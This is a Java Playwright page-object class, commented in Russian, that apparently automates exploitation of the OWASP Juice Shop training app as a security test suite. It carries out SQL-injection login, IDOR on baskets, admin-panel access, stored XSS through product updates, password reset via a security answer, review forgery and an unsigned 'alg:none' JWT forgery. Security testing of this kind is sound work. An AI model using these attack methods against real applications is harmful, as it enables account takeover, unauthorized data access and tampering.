package pages;

import com.microsoft.playwright.Locator;
import com.microsoft.playwright.Page;
import config.TestConfig;
import io.qameta.allure.Allure;
import io.qameta.allure.Step;

import java.io.ByteArrayInputStream;
import java.nio.charset.StandardCharsets;

import static com.microsoft.playwright.assertions.PlaywrightAssertions.assertThat;

public class SecurityPage {
    private final Page page;
    private boolean dialogAppeared = false;   // ← ПОЛЕ класса

    public SecurityPage(Page page) {
        this.page = page;
        // ← добавь регистрацию обработчика диалога
        page.onDialog(dialog -> {
            System.out.println(">>> XSS СРАБОТАЛ! Alert: " + dialog.message());
            this.dialogAppeared = true;
            dialog.accept();
        });
    }

    @Step("Выполнить SQL-инъекцию в логине с payload: {payload}")
    public SecurityPage attemptSqlInjectionLogin(String payload) {
        page.navigate("TestConfig.getBaseUrl()"); // или TestConfig.getBaseUrl()

        // Заполняем поля
        page.locator("#emailControl").fill(payload);
        page.locator("#passwordControl").fill("any_password");
        page.locator("#loginButton").click();

        return this;
    }

    @Step("Проверить, что вход выполнен (токен в localStorage)")
    public void assertLoggedIn() {
        // Ждём, пока URL сменится (уйдёт с логина)
        page.waitForURL("**/", new Page.WaitForURLOptions().setTimeout(10_000));

        // Проверяем наличие токена
        String token = (String) page.evaluate("() => localStorage.getItem('token')");
        if (token == null || token.isEmpty()) {
            throw new AssertionError("Токен не найден в localStorage. Вход не выполнен.");
        }
        System.out.println(">>> SQL-инъекция успешна! Получен токен: " + token.substring(0, 20) + "...");
    }

    @Step("Получить ID своей корзины")
    public int getMyBasketId() {
        Object result = page.evaluate(
                "async () => { " +
                        "  const token = localStorage.getItem('token'); " +
                        "  if (!token) return -1; " +
                        // Запрос к СВОЕЙ корзине. Замени 6 на свой ID из DevTools, если он фиксирован.
                        "  const res = await fetch('/rest/basket/6', { " +
                        //"  const res = await fetch('/rest/user/whoami', { " +
                        "    headers: { 'Authorization': 'Bearer ' + token } " +
                        "  }); " +
                        "  const text = await res.text(); " + // Сначала читаем как текст
                        "  if (text.startsWith('<')) return -2; " + // Если HTML — возвращаем маркер
                        "  const data = JSON.parse(text); " +
                        // whoami возвращает { user: { bid: 6, email: ... } }
                        "  return data.data.id; " +
                        //"  return data.user.bid; " +
                        "}"

        );
        int id = ((Number) result).intValue();
        System.out.println(">>> Мой basketId (или маркер ошибки): " + id);
        return id;
    }
    @Step("Выполнить IDOR и прикрепить ответ")
    public SecurityPage attemptIdorOnBasketWithEvidence(int basketId) {
        Object response = page.evaluate(
                "async (id) => { " +
                        "  const token = localStorage.getItem('token'); " +
                        "  if (!token) return { status: 401, body: 'No token in localStorage' }; " +
                        "  const res = await fetch('/rest/basket/' + id, { " +
                        "    headers: { 'Authorization': 'Bearer ' + token } " +
                        "  }); " +
                        "  return { status: res.status, body: await res.text() }; " +
                        "}",
                basketId
        );

        java.util.Map<?, ?> result = (java.util.Map<?, ?>) response;
        int status = ((Number) result.get("status")).intValue();
        String body = (String) result.get("body");

        System.out.println(">>> IDOR /rest/basket/" + basketId + ": Status=" + status);
        System.out.println("    Body: " + body);

        // Прикрепляем ответ в Allure (доказательство для портфолио)
        io.qameta.allure.Allure.addAttachment(
                "IDOR Response: /rest/basket/" + basketId,
                "application/json",
                new java.io.ByteArrayInputStream(body.getBytes(java.nio.charset.StandardCharsets.UTF_8)),
                "json"
        );

        return this;
    }
    @Step("Попытаться открыть админ-панель без прав администратора")
    public SecurityPage attemptAdminSectionAccess() {
        page.navigate(TestConfig.getBaseUrl() + "/#/administration");
        page.waitForTimeout(2000); // ждём, пока Angular обработает маршрут
        return this;
    }

    @Step("Проверить, что админ-панель доступна обычному пользователю (уязвимость)")
    public void assertAdminSectionAccessible() {
        // Если нас редиректнуло на логин или главную — уязвимости нет
        String url = page.url();
        if (url.contains("/login") || !url.contains("/administration")) {
            throw new AssertionError("Админ-панель недоступна обычному пользователю. URL: " + url);
        }
        System.out.println(">>> Уязвимость подтверждена: обычный пользователь видит админ-панель");
    }
    @Step("Проверить, что в админ-панели отображаются пользователи")
    public void assertUsersTableNotEmpty() {
        Locator rows = page.locator("mat-table mat-row, table tbody tr");
        int count = rows.count();
        if (count == 0) {
            throw new AssertionError("Таблица пользователей пуста");
        }
        System.out.println(">>> В админ-панели " + count + " пользователей");
    }
    @Step("Проверить, что в таблице есть admin@juice-sh.op")
    public void assertAdminUserPresent() {
        Locator adminRow = page.locator("mat-table mat-row, table tbody tr",
                new Page.LocatorOptions().setHasText("admin@juice-sh.op"));
        if (adminRow.count() == 0) {
            throw new AssertionError("В таблице нет admin@juice-sh.op");
        }
        System.out.println(">>> admin@juice-sh.op найден в таблице");
    }
    @Step("Выполнить API-only XSS: изменить описание товара id={productId} payload: {payload}")
    public SecurityPage attemptApiXss(int productId, String payload) {
        Object response = page.evaluate(
                "async (args) => { " +
                        "  const [id, payload] = args; " +
                        "  const token = localStorage.getItem('token'); " +
                        "  if (!token) return { status: 401, body: 'No token in localStorage' }; " +
                        "  const res = await fetch('/api/products/' + id, { " +
                        "    method: 'PUT', " +
                        "    headers: { " +
                        "      'Authorization': 'Bearer ' + token, " +
                        "      'Content-Type': 'application/json' " +
                        "    }, " +
                        "    body: JSON.stringify({ description: payload }) " +
                        "  }); " +
                        "  return { status: res.status, body: await res.text() }; " +
                        "}",
                java.util.List.of(productId, payload)
        );

        java.util.Map<?, ?> result = (java.util.Map<?, ?>) response;
        int status = ((Number) result.get("status")).intValue();
        String body = (String) result.get("body");

        System.out.println(">>> API XSS PUT /api/products/" + productId + ": Status=" + status);
        System.out.println("    Body: " + body);

        if (status != 200 && status != 201) {
            throw new AssertionError(
                    "PUT не удался. Статус: " + status + ", Body: " + body +
                            ". Убедись, что залогинен как админ (через SQLi).");
        }
        return this;
    }

    @Step("Проверить, что API-only XSS сработал (payload в описании товара)")
    public void assertApiXssTriggered(int productId) {
        // Переходим на страницу товара
        page.navigate(TestConfig.getBaseUrl() + "/#/search?q=apple");
        page.waitForTimeout(2000);

        // Открываем карточку товара
        page.locator("mat-card.ribbon-card").first().click();
        page.waitForTimeout(2000);

        // Проверяем, что alert появился (флаг dialogAppeared из onDialog)
        if (!dialogAppeared) {
            throw new AssertionError(
                    "API-only XSS не сработал: alert не появился после открытия товара " + productId);
        }
        System.out.println(">>> API-only XSS подтверждён!");
    }
    @Step("Сбросить пароль пользователя {email} через security question")
    public SecurityPage resetPasswordViaSecurityQuestion(String email, String answer, String newPassword) {
        // 1. Открываем страницу восстановления пароля
        page.navigate(TestConfig.getBaseUrl() + "/#/forgot-password");
        page.waitForTimeout(1000);

        // 2. Вводим email
        page.locator("#email").fill(email);
        page.waitForTimeout(500);

        // 3. Отвечаем на секретный вопрос
        page.locator("#securityAnswer").fill(answer);
        page.waitForTimeout(500);

        // 4. Вводим новый пароль (дважды)
        page.locator("#newPassword").fill(newPassword);
        page.locator("#newPasswordRepeat").fill(newPassword);

        // 5. Нажимаем кнопку сброса
        page.locator("#resetButton").click();
        page.waitForTimeout(2000);

        System.out.println(">>> Пароль для " + email + " сброшен на: " + newPassword);
        return this;
    }
    @Step("Подделать отзыв от имени {targetAuthor} с текстом: {message}")
    public SecurityPage forgeReview(String targetAuthor, String message) {
        // ID товара, к которому оставляем отзыв (например, 1)
        int productId = 1;

        Object response = page.evaluate(
                "async (args) => { " +
                        "  const [productId, author, message] = args; " +
                        "  const token = localStorage.getItem('token'); " +
                        "  if (!token) return { status: 401, body: 'No token' }; " +
                        // Используем PUT /rest/products/{id}/reviews, как в официальном решении
                        "  const res = await fetch('/rest/products/' + productId + '/reviews', { " +
                        "    method: 'PUT', " +
                        "    headers: { " +
                        "      'Authorization': 'Bearer ' + token, " +
                        "      'Content-Type': 'application/json' " +
                        "    }, " +
                        "    body: JSON.stringify({ author: author, message: message }) " +
                        "  }); " +
                        "  return { status: res.status, body: await res.text() }; " +
                        "}",
                java.util.List.of(productId, targetAuthor, message)
        );

        java.util.Map<?, ?> result = (java.util.Map<?, ?>) response;
        System.out.println(">>> Forged Review PUT: Status=" + result.get("status"));
        System.out.println("    Body: " + result.get("body"));

        if (((Number) result.get("status")).intValue() != 201 && ((Number) result.get("status")).intValue() != 200) {
            throw new AssertionError("Не удалось подделать отзыв. Статус: " + result.get("status"));
        }

        return this;
    }
    @Step("Выполнить Unsigned JWT (alg:none) атаку")
    public SecurityPage attemptUnsignedJwt() {
        // 1. Формируем токен вручную (Base64Url без padding)
        String header = "{\"alg\":\"none\",\"typ\":\"JWT\"}";
        String payload = "{\"data\":{\"email\":\"jwtn3d@juice-sh.op\"},\"iat\":1700000000,\"exp\":2000000000}";

        String encodedHeader = java.util.Base64.getUrlEncoder().withoutPadding()
                .encodeToString(header.getBytes(java.nio.charset.StandardCharsets.UTF_8));
        String encodedPayload = java.util.Base64.getUrlEncoder().withoutPadding()
                .encodeToString(payload.getBytes(java.nio.charset.StandardCharsets.UTF_8));

        // Подпись пустая, но точка в конце обязательна
        String forgedToken = encodedHeader + "." + encodedPayload + ".";

        System.out.println(">>> Сформирован unsigned JWT: " + forgedToken);

        // 2. Проверяем токен через API (whoami)
        Object response = page.evaluate(
                "async (token) => { " +
                        "  const res = await fetch('/rest/user/whoami', { " +
                        "    headers: { 'Authorization': 'Bearer ' + token } " +
                        "  }); " +
                        "  return { status: res.status, body: await res.text() }; " +
                        "}",
                forgedToken
        );

        java.util.Map<?, ?> result = (java.util.Map<?, ?>) response;
        int status = ((Number) result.get("status")).intValue();
        String body = (String) result.get("body");

        System.out.println(">>> Unsigned JWT whoami: Status=" + status + ", Body=" + body);
        // Прикрепляем JSON-ответ в Allure как доказательство
        Allure.addAttachment(
                "Unsigned JWT: /rest/user/whoami Response",
                "application/json",
                new ByteArrayInputStream(body.getBytes(StandardCharsets.UTF_8)),
                "json");
        if (status != 200) {
            throw new AssertionError("Unsigned JWT не сработал. Статус: " + status + ", Body: " + body);
        }

        // 3. Опционально: подставляем токен в localStorage для UI-проверок
        page.evaluate("(token) => localStorage.setItem('token', token)", forgedToken);

        System.out.println(">>> Unsigned JWT подтверждён (статус 200)");
        return this;
    }
    @Step("Подменить описание товара id={productId} через API")
    public SecurityPage tamperProductDescription(int productId, String newDescription) {
        Object response = page.evaluate(
                "async (args) => { " +
                        "  const [id, description] = args; " +
                        "  const token = localStorage.getItem('token'); " +
                        "  if (!token) return { status: 401, body: 'No token' }; " +
                        "  const res = await fetch('/api/Products/' + id, { " +
                        "    method: 'PUT', " +
                        "    headers: { " +
                        "      'Authorization': 'Bearer ' + token, " +
                        "      'Content-Type': 'application/json' " +
                        "    }, " +
                        "    body: JSON.stringify({ description: description }) " +
                        "  }); " +
                        "  return { status: res.status, body: await res.text() }; " +
                        "}",
                java.util.List.of(productId, newDescription)
        );

        java.util.Map<?, ?> result = (java.util.Map<?, ?>) response;
        int status = ((Number) result.get("status")).intValue();
        String body = (String) result.get("body");

        System.out.println(">>> Product Tampering PUT /api/Products/" + productId + ": Status=" + status);
        System.out.println("    Body: " + body);

        if (status != 200) {
            throw new AssertionError("Не удалось изменить товар. Статус: " + status + ", Body: " + body);
        }
        System.out.println(">>> Описание товара успешно изменено");
        return this;
    }
    @Step("Получить описание товара id={productId}")
    public String getProductDescription(int productId) {
        Object result = page.evaluate(
                "async (id) => { " +
                        "  const res = await fetch('/api/Products/' + id); " +
                        "  const data = await res.json(); " +
                        "  return data.data.description; " +
                        "}",
                productId
        );
        return (String) result;
    }




}
